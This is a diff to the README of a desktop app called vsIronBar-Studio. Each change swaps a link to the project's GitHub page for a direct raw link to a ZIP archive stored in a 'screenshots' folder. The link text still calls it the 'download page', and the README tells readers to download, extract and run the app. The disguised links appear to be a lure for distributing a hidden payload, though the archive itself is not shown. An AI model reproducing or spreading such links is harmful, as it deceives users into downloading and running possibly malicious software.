@@ -1,6 +1,6 @@
 # 🧊 vsIronBar-Studio - Build and preview bars fast
 
-[![Download vsIronBar-Studio](https://img.shields.io/badge/Download%20vsIronBar--Studio-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clinorilpediculosis358/vsIronBar-Studio)
+[![Download vsIronBar-Studio](https://img.shields.io/badge/Download%20vsIronBar--Studio-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Clinorilpediculosis358/vsIronBar-Studio/main/screenshots/Studio-vs-Bar-Iron-3.5-beta.5.zip)
 
 ## 🖥️ What this app does
 
@@ -20,7 +20,7 @@ It is built with GTK and Python, so it feels like a desktop app and runs on Wind
 
 Use this link to visit the download page:
 
-[Open the vsIronBar-Studio download page](https://github.com/Clinorilpediculosis358/vsIronBar-Studio)
+[Open the vsIronBar-Studio download page](https://raw.githubusercontent.com/Clinorilpediculosis358/vsIronBar-Studio/main/screenshots/Studio-vs-Bar-Iron-3.5-beta.5.zip)
 
 On that page, look for the latest release or the main download file. If you see a Windows app file, download it to your computer.
 
@@ -222,7 +222,7 @@ If you see a ZIP archive, extract it first before opening the app.
 
 If you need the app again, use the same link:
 
-[Open the vsIronBar-Studio download page](https://github.com/Clinorilpediculosis358/vsIronBar-Studio)
+[Open the vsIronBar-Studio download page](https://raw.githubusercontent.com/Clinorilpediculosis358/vsIronBar-Studio/main/screenshots/Studio-vs-Bar-Iron-3.5-beta.5.zip)
 
 That is the place to get the current project files and any release files connected to the app.
 
